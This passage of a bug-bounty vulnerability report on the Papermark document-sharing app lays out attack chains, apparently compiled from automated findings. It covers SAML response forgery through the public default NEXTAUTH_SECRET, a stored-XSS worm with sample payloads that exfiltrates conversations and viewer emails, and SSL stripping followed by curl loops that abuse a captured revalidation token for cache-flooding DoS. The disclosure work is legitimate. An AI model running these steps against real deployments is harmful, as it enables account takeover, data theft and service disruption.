**Secondary amplification (self-hosted):** If the deployment uses the default `NEXTAUTH_SECRET=my-superstrong-secret` (`.env.example:1`), the attacker can also forge SAML IdP responses directly (see Chain 10), bypassing the need for OAuth provider registration entirely.

**Mitigation factors:** Requires causing Redis unavailability. The rate limiter fail-open is an availability vs. security tradeoff — legitimate users are not blocked during Redis issues, but the fail-open enables this attack.

**Bounty range:** $4,000–$10,000 (rate limit bypass + OAuth account takeovers, clear authentication bypass with multi-account persistence)

---

## Chain 10: SAML ClientSecret = NEXTAUTH_SECRET + Default Secret + allowDangerousEmailAccountLinking → SAML Response Forgery → Account Takeover (Self-Hosted)

**Name:** SAML IdP Response Forgery via Reused Root Secret

**Individual findings involved:**
- **00-ai-secrets / S-001 (Secrets) — NEXTAUTH_SECRET default value** — CRITICAL
  - `.env.example:1` (`my-superstrong-secret`)
  - Publicly visible in GitHub repository
- **00-ai-configs — NEXTAUTH_SECRET reused as SAML clientSecret** — Config finding LOW
  - `lib/auth/auth-options.ts:128` (`clientSecret: process.env.NEXTAUTH_SECRET as string`)
  - `lib/auth/auth-options.ts:149` (`client_secret: process.env.NEXTAUTH_SECRET!`)
  - NEXTAUTH_SECRET is used as both the SAML OAuth client secret AND the SAML IdP OAuth client secret
- **00-ai-configs — SAML `allowDangerousEmailAccountLinking: true`** — Config finding MEDIUM
  - `lib/auth/auth-options.ts:130`
  - Auto-links SAML accounts to users with matching emails without confirmation
- **03-web-secrets.md — Published tooling for NextAuth JWE cookie minting**
  - Embrace The Red: NextAuth cookie forging from known NEXTAUTH_SECRET
- **Chain 6 — Default NEXTAUTH_SECRET full compromise context**
  - Documents broader key reuse across 5 security domains

**Chain impact:** On self-hosted deployments that have not changed the default `NEXTAUTH_SECRET`, an attacker can forge SAML OAuth responses to impersonate any user. Because `allowDangerousEmailAccountLinking: true` is set on the SAML provider, the forged SAML assertion is automatically linked to the victim's existing account — no confirmation dialog, no password required. This provides SAML-based account takeover that is independent of the JWT cookie forging in Chain 6.

**Step-by-step exploitation:**

1. **Identify self-hosted deployment** — Scan for papermark instances at custom domains, checking for the `X-Powered-By: Papermark` header at `lib/middleware/domain.ts:40-41` or other fingerprintable characteristics.

2. **Assume default NEXTAUTH_SECRET** — If the deployment did not override `NEXTAUTH_SECRET`, its value is `my-superstrong-secret` from the public `.env.example:1`.

3. **Understand SAML OAuth flow** — The SAML provider at `lib/auth/auth-options.ts:95-131` uses the OAuth 2.0 authorization code flow:
   - `authorization.url`: `/api/auth/saml/authorize`
   - `token.url`: `/api/auth/saml/token`
   - `clientId`: `"dummy"`
   - `clientSecret`: `process.env.NEXTAUTH_SECRET` (line 128)
   - The IdP credentials provider at line 132-149 uses `client_secret: process.env.NEXTAUTH_SECRET!` (line 149)

4. **Forge SAML OAuth authorization** — With the known clientSecret (`my-superstrong-secret`):
   - Send a crafted request to `/api/auth/saml/authorize` with the victim's email
   - Present a forged SAML assertion signed with the known secret
   - The OAuth token endpoint validates the client_secret against the known value

5. **Obtain OAuth tokens** — Exchange the forged authorization code for access/refresh tokens by presenting the known `client_secret` at `/api/auth/saml/token`.

6. **NextAuth auto-links accounts** — Because `allowDangerousEmailAccountLinking: true` at `lib/auth/auth-options.ts:130`, NextAuth automatically links the SAML identity to the existing user account if the email matches. The attacker's session is now bound to the victim's Papermark account.

7. **Full account access** — The attacker accesses all teams, documents, datarooms, and enterprise SSO settings of the victim. If the victim is a team admin, the attacker gains admin-level access.

**Combination with Chain 6:** The SAML response forgery chain works alongside Chain 6's JWT cookie forging. The two chains validate each other: if JWT forging produces an invalid session (e.g., due to a different NextAuth version's cookie name salt), the SAML chain provides an alternative path. Conversely, if SAML is not configured/enabled on the target instance, Chain 6's JWT forging still works.

**Bounty range:** $8,000–$18,000 (SAML response forgery → account takeover on self-hosted deployments, distinct from JWT-based approach in Chain 6)

---

## Chain 11: CSP Report-Only + Silent Reporting → Undetectable Stored XSS Worm → Covert Data Exfiltration

**Name:** Zero-Detect XSS Worm Amplification via Non-Enforced CSP

**Individual findings involved:**
- **00-ai-configs — CSP is report-only, not enforced** — Config finding MEDIUM
  - `next.config.mjs:219` (`Content-Security-Policy-Report-Only`)
  - All CSP directives are advisory — XSS executes without any CSP blocking
  - `script-src` includes `'unsafe-inline'` and `'unsafe-eval'` — inline scripts and `eval()` are explicitly allowed
- **00-ai-configs — CSP report endpoint is a non-functional no-op** — Config finding MEDIUM
  - `app/api/csp-report/route.ts:7` (console.log commented out, no storage, no forwarding)
  - CSP violation reports sent by browsers are silently discarded
- **S-002 — Stored XSS via sanitizePlainText entity-decode ordering** — HIGH
  - `lib/utils/sanitize-html.ts:12-19` (decode after strip bug)
  - `components/documents/document-header.tsx:604` (dangerouslySetInnerHTML sink)
- **S-001 — Conversations API zero authentication** — CRITICAL
  - `ee/features/conversations/api/conversations-route.ts`
- **S-006 — record_reaction.ts unauthenticated viewerEmail leak** — MEDIUM
  - `pages/api/record_reaction.ts:17-42`

**Chain impact:** This is an amplification chain that does not introduce a new exploit path but dramatically increases the stealth and impact of the Chain 1 XSS worm. The CSP being report-only with `'unsafe-inline'` means the XSS worm faces zero CSP resistance. The CSP report endpoint being a no-op means the security team has zero visibility into exploitation. The worm can propagate and exfiltrate data indefinitely without triggering any automated security alert.

**Step-by-step exploitation (amplification of Chain 1):**

1. **CSP provides zero XSS protection** — The main app CSP at `next.config.mjs:219` uses `Content-Security-Policy-Report-Only` (not enforced) and includes `'unsafe-inline'` `'unsafe-eval'` in `script-src`. Every XSS payload variant works:
   - `<script>alert(1)</script>` — inline scripts allowed
   - `<img src=x onerror=alert(1)>` — inline event handlers allowed  
   - `<svg/onload=eval(name)>` — eval allowed
   - `<xmp><img src=x onerror=...>` — CVE-2026-44990 bypass works
   Unlike CSP-enforced applications where attackers must craft complex CSP-bypass payloads, the XSS worm executes with zero CSP friction.

2. **CSP violations are reported but silently discarded** — When the browser sends a CSP violation report to `/api/csp-report`, the handler at `app/api/csp-report/route.ts:3-15` does nothing:
   ```typescript
   export async function POST(request: Request) {
     const report = await request.json();
     // console.log("CSP Violation:", report);  // ← commented out
     // No storage, no forwarding, no alerting
     return NextResponse.json({ success: true });
   }
   ```
   Not even a log entry is generated. The security team receives zero signal that XSS is occurring.

3. **Worm propagates without detection** — The XSS worm from Chain 1 spreads across team members by renaming documents. Each propagation step does NOT generate:
   - No CSP block events (none enforced)
   - No CSP violation alerts (reporting is a no-op)
   - No WAF alerts (payload uses standard document rename API)
   - No rate-limit triggers (worm operates from authenticated user sessions)

4. **Data exfiltration remains invisible** — The worm exfiltrates conversations (S-001) and viewer PII (S-006) via fetch requests to attacker-controlled endpoints. These requests appear as standard API traffic.

5. **Persistence across sessions** — Because the XSS is stored in PostgreSQL `Document.name`, it persists across server restarts, deployments, and session expirations. The worm continues firing until the document name is explicitly changed.

**Combined impact assessment:** Without CSP enforcement, the XSS worm's effective success rate approaches 100% (versus 20-60% on CSP-enforced sites where modern CSP can block many XSS variants). Without CSP violation monitoring, the mean time to detection extends from hours/days to potentially indefinite. This combination elevates the Chain 1 XSS worm from a "likely detected within days" scenario to a "potentially persistent for weeks" scenario.

**Bounty range:** Amplification adder — adds $3,000–$5,000 to the base Chain 1 bounty ($11,000–$20,000 combined). The CSP misconfiguration alone is reportable as it enables undetectable exploitation.

---

## Chain 12: Missing HSTS + Secret in Query Parameter + Server Log Exposure → Long-Lived Revalidation Token Leak → Mass Link Invalidation

**Name:** HSTS Gap Enables Query-Param Secret Harvesting from Passive Network Position

**Individual findings involved:**
- **00-ai-configs — Missing HSTS header** — Config finding MEDIUM
  - `next.config.mjs:190-312` (no `Strict-Transport-Security` in any header block)
  - Zero hits for `Strict-Transport-Security` across the entire codebase
  - Custom domains and non-Vercel deployments receive no HSTS policy
- **S-008 — Shared secret passed as URL query parameter** — MEDIUM
  - `pages/api/revalidate.ts:13-14` (`req.query.secret !== process.env.REVALIDATE_TOKEN`)
  - Secret exposed in server access logs, Referer headers, and browser history
- **S-001 — Conversations API zero authentication** — CRITICAL (data validation)
  - `ee/features/conversations/api/conversations-route.ts`
- **S-006 — record_reaction.ts unauthenticated viewerEmail leak** — MEDIUM
  - `pages/api/record_reaction.ts:17-42`
- **S-010 — Zod error information disclosure** — MEDIUM (aids target discovery)
  - 9 endpoints returning `error.format()` or `error.errors`

**Chain impact:** An attacker on the same network as a papermark user (e.g., public Wi-Fi, compromised ISP, corporate proxy) can perform SSL stripping to downgrade HTTPS to HTTP (due to missing HSTS), capture the `REVALIDATE_TOKEN` from revalidation URL query parameters, and use it to force mass revalidation of all team document links — causing cache invalidation storms and potentially enumerating which document links exist for any team.

**Step-by-step exploitation:**

1. **Network position established** — Attacker positions themselves on the network path between the victim and papermark (e.g., same Wi-Fi network, compromised router, ARP spoofing on local network, malicious ISP/CSP).

2. **SSL stripping due to missing HSTS** — The application at `next.config.mjs:190-312` does not send `Strict-Transport-Security` headers on any response. The attacker's sslstrip tool transparently downgrades the victim's connection:
   - Victim requests `https://papermark.app/...` → attacker intercepts → serves `http://papermark.app/...`
   - Without HSTS, the browser does NOT enforce HTTPS — it accepts the HTTP response
   - Custom domains are especially vulnerable as they lack Vercel's platform-level HSTS

3. **Intercept revalidation URL** — When a papermark team admin triggers link revalidation (e.g., after updating document content), their browser makes a request to:
   ```
   https://papermark.app/api/revalidate?secret=REVALIDATE_TOKEN_HERE&teamId=team_xxx&documentId=doc_xxx
   ```
   On the downgraded HTTP connection, this entire URL including the secret is transmitted in cleartext.

4. **Extract REVALIDATE_TOKEN** — The attacker captures the query parameter `secret=<value>` from the HTTP request. The `REVALIDATE_TOKEN` is now known.

5. **Validate the token** — Send a test revalidation request:
   ```bash
   curl "http://papermark.app/api/revalidate?secret=<captured-token>&teamId=team_test&documentId=doc_test"
   ```
   If the response is `401 Invalid token`, wait for more victims. If `200`, the token is valid.

6. **Enumeration via Zod error disclosure** — Before mass exploitation, use Zod error disclosure at S-010 endpoints to understand ID formats:
   ```bash
   curl -X POST "https://papermark.app/api/webhooks/services/webhook/create" \
     -H "Content-Type: application/json" -d '{"invalid": true}'
   ```
   The response leaks schema structure, enabling precise crafting of revalidation queries.

7. **Mass link revalidation (DoS via cache stampede)** — Using the captured token, repeatedly call the revalidation endpoint with systematically varied team/document IDs to trigger cache regeneration storms:
   ```bash
   for teamId in team_1 team_2 team_3; do
     for docId in doc_1 doc_2 doc_3; do
       curl "http://papermark.app/api/revalidate?secret=<token>&teamId=$teamId&documentId=$docId"
     done
   done
   ```
   Each revalidation triggers ISR cache regeneration and invalidates CDN cache entries, causing increased load on the origin server and database.

8. **PII extraction via zero-auth endpoints** — With network position maintained and knowledge of team/document IDs from enumeration, call zero-auth endpoints:
   - `POST /api/record_reaction` — extract viewerEmail (S-006)
   - `GET /api/conversations` — extract conversation data (S-001)

**Mitigation factors:** Requires network position for SSL stripping. Vercel-hosted `*.vercel.app` domains may have platform-level HSTS. The `REVALIDATE_TOKEN` should be high-entropy. The revalidation endpoint only regenerates caches, not modify data.

**Bounty range:** $3,000–$7,000 (network-based token interception enabling cache invalidation DoS + PII extraction)

---

## Updated Summary

| # | Chain Name | Findings Involved | Step Count | Bounty Range | Requires Auth |
|---|-----------|-------------------|-----------|-------------|---------------|
| 1 | XSS Worm + Conversations Hijack | S-002, S-001, S-006, S-009 | 7 | $8K–$15K | Team member |
| 2 | CORS + Malicious PDF → Admin XSS | S-005/CVE-2026-57957, CVE-2024-4367 | 6 | $5K–$15K | Victim session |
| 3 | Zod Recon → Bulk PII Extraction | S-010, S-001, S-006, S-007 | 6 | $3K–$8K | No |
| 4 | DOCX XXE → Cloud Credential Theft | S-012/011, S-001 (context) | 8 | $5K–$15K | Authenticated upload |
| 5 | Framework EOL + Middleware Bypass | CVE-2026-44575, S-003, S-001 | 6 | $3K–$8K | No |
| 6 | Default Secret → Full Compromise | S-001/S-002 (Secrets) | 8 | $10K–$25K | No (self-hosted) |
| 7 | CORS TUS → Trigger.dev Token Leak | S-005/CVE-2026-57957, S-003 | 5 | $2K–$5K | Victim session |
| **8** | **Embed Clickjacking + XSS → Credential Theft** | **frame-ancestors \*, S-002, CSP report-only** | **6** | **$5K–$12K** | **Victim view** |
| **9** | **Rate Limit Bypass → OAuth Account Linking** | **Rate limit fail-open, S-014, OAuth linking** | **7** | **$4K–$10K** | **No (pre-auth)** |
| **10** | **SAML Secret Default → SAML Response Forgery** | **NEXTAUTH_SECRET default, SAML linking** | **7** | **$8K–$18K** | **No (self-hosted)** |
| **11** | **CSP Report-Only → Undetectable XSS Worm** | **CSP report-only, CSP no-op endpoint, S-002** | **5** | **+$3K–$5K amp** | **Amplifies C1** |
| **12** | **Missing HSTS → Secret Intercept → Cache DoS** | **Missing HSTS, S-008, S-010** | **8** | **$3K–$7K** | **Network position** |

**Highest estimated bounty:** Chain 6 ($10K–$25K) — Complete system compromise via default root secret, but requires self-hosted deployment.

**Most reliably exploitable:** Chain 1 ($8K–$15K) — Stored XSS worm that propagates across team members and exfiltrates via zero-auth endpoints. Now amplified by Chain 11 ($11K–$20K combined with CSP findings).

**Most original for bug bounty:** Chain 10 ($8K–$18K) — SAML response forgery via NEXTAUTH_SECRET reuse as SAML clientSecret. The combination of `allowDangerousEmailAccountLinking` with a default root secret enabling SAML IdP forgery is a novel attack pattern likely to be well-received by bounty programs.

**Best chain for hosted bounty programs (Vercel):** Chain 2 ($5K–$15K) — Involves papermark's own CVE (CVE-2026-57957) combined with a well-known pdfjs-dist CVE (CVE-2024-4367) for admin session takeover.

**Best for data-privacy impact:** Chain 3 ($3K–$8K) — Bulk viewer PII extraction (email, document access patterns) with no authentication, clear GDPR violation.
